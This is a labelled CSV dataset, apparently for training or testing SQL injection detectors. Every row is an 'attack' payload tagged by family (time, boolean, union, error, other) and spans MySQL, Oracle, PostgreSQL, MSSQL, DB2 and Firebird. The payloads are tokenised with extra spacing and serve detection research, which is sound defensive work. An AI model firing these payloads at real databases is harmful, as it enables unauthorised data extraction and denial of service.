label,payload,family
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,time
attack,"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",boolean
attack,"-9932"" union all select 4049,4049,4049--",union
attack,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
attack,1'+  (  select 'hjku' where 1954  =  1954 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',time
attack,"1  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  1624  =  1624",error
attack,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""smhd"" like ""smhd",error
attack,"-1174"" union all select 4303,4303,4303,4303#",union
attack,"1   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxhn' like 'zxhn",error
attack,"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",other
attack,-1217'   )    )     )   order by 1#,other
attack,"iif  (  2205  =  4764,1,1/0  )  ",other
attack,"1"" union all select null,null,null,null,null,null,null,null,null#",union
attack,"select * from generate_series  (  3267,3267,case when   (  3267  =  5900  )   then 1 else 0 end  )   limit 1--",other
attack,"-5148""   )    )    or 5310  =  8229",boolean
attack,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  9505  =  9505,time
attack,1   )    )     )   and 9198  =  9198--,boolean
attack,1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1'+  (  select 'zugq' where 9218  =  9218,other
attack,"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",boolean
attack,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",union
attack,"-1889%'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",error
attack,"1' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",boolean
attack,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",union
attack,"1"" where 7158  =  7158",other
attack,"1""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,1 where 3735  =  3735,other
attack,"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz",boolean
attack,"1%""   )    )    and 9198  =  9198--",boolean
attack,"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",error
attack,"1'||  (  select 'uvbb' where 7795  =  7795 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",boolean
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'ksoc'  =  'ksoc,time
attack,select   (  case when   (  1005  =  5996  )   then 1 else 1005*  (  select 1005 from master..sysdatabases  )   end  )  --,other
attack,"-9272%""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,error
attack,1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--,boolean
attack,-9191'  )   as qtvm where 2838  =  2838 or   (  8459  =  8459  )  *4906--,boolean
attack,select   (  case when   (  4935  =  4734  )   then 4935 else 4935*  (  select 4935 from mysql.db  )   end  )  #,other
attack,"-9840   )    )    as thod where 4790  =  4790 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",boolean
attack,"1   )    )    as hgtl where 3864  =  3864 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1%""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,error
attack,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",time
attack,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # eahg",error
attack,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union
attack,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",error
attack,"1  )   where 6954  =  6954 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean
attack,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'hqcz'  =  'hqcz,time
attack,"1""  )   as ivkw where 4218  =  4218 union all select null--",union
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,time
attack,"1""  )   where 2088  =  2088 union all select null,null,null,null--",union
attack,"-2230%"" union all select 3303,3303,3303--",union
attack,"1""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"-4418"" or 6872  =  6872 and ""gbut""  =  ""gbut",boolean
attack,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,time
attack,"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",union
attack,1'||  (  select 'brde' where 7390  =  7390 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',error
attack,"1%""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""%""  =  """,boolean
attack,1' where 9242  =  9242,other
attack,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",boolean
attack,"1""  )   as jask where 7629  =  7629 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",boolean
attack,"-5235  )   or make_set  (  9354  =  9354,7185  )  ",boolean
attack,"-9820"" or 1038  =  7502#",boolean
attack,"1   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  9462  =  9462",boolean
attack,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",error
attack,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",boolean
attack,"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",boolean
attack,-5852  )   as anca where 3574  =  3574 or 3958  =  5536#,boolean
attack,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",other
attack,"1%""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"-2840'   )    )     )   union all select 3025,3025,3025,3025--",union
attack,select case when 5346  =  8272 then 1 else null end--,other
attack," select sleep  (  5  )   and ""oivc"" like ""oivc",time
attack,"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",union
attack,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,time
attack,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",boolean
attack,"1'||  (  select 'skds' from dual where 8594  =  8594 and make_set  (  6779  =  2027,2027   )    )   ||'",boolean
attack,"1%' union all select null,null--",union
attack,"1""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,1'  )   as imgv where 7802  =  7802,other
attack,1'+  (  select 'vidl' where 9445  =  9445 and 5498  =  5777#,boolean
attack,"1   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4277  =  4277",boolean
attack,"1%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '%'  =  '",error
attack,"1%' union all select null,null,null,null,null,null--",union
attack,"-4072%""   )    )     )   or 3999  =  1979",boolean
attack,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",union
attack,"1"" and sleep  (  5  )  #",time
attack,"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""kpwc"" like ""kpwc",boolean
attack,"-4728""   )    )    as ndri where 3278  =  3278 or make_set  (  9354  =  9354,7185  )  --",boolean
attack,"1""  )   as obbk where 6414  =  6414 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",error
attack,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""ppml""  =  ""ppml",time
attack,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",error
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",boolean
attack,-3105' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'srep'  =  'srep,error
attack,-4339  )   where 7178  =  7178 or 4008  =  7232,boolean
attack,"1""   )    )    as irrz where 8730  =  8730 order by 1#",other
attack,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",union
attack,"1""  )   as cysq where 5258  =  5258",other
attack,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",time
attack,"-4639""   )    )     )   or 8550  =  9348",boolean
attack,"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",time
attack,1  )   as fhvr where 5544  =  5544,other
attack,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",boolean
attack,select case when 1238  =  9044 then 1 else null end--,other
attack,"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg",boolean
attack,"1,  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",other
attack,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",union
attack,1   )    )    and 9198  =  9198--,boolean
attack,1' in boolean mode  )   waitfor delay '0:0:5'--,time
attack,"1%""   )    )     )   union all select null,null,null,null,null#",union
attack,"-8888%'  )   union all select 5312,5312,5312,5312,5312,5312,5312,5312--",union
attack,"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,-7230'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'khtc'  =  'khtc,boolean
attack,"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""dnlz""  =  ""dnlz",boolean
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,time
